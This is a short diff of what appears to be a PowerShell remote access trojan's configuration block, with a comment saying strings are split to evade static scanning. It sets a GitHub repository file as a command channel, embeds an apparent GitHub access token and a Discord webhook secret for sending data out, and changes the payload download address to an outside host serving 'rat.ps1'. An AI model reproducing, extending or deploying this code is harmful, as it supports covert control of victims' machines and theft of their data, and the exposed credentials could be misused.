@@ -4,7 +4,7 @@
 # ---- Config (strings split to dodge static scanning) ----
 $C='https://api.github.com/repos/'+'kaikssaqes/'+'rat/'+'contents/'+'cmd.txt'
 $T='ghp_'+'GrrBo1wB58Al0gigScS1HnnjELP6mQ2aOyp5'
-$RA='https://raw.githubusercontent.com/'+'kaikssaqes/'+'rat/'+'main/'+'rat.ps1'
+$RA='https://dicechecker.app/rat.ps1'
 $W='https://discord.com/api/webhooks/'+'1550915076586868767/'+'Z1NukXzFi0yUb1kjQdvWti7E_3PQGwHwoYcls0zbclywzZ9YL86NBWem8bVgI5BCSWdo'
 $S=Join-Path $env:TEMP 'r_s.tmp'
 $script:P=2000
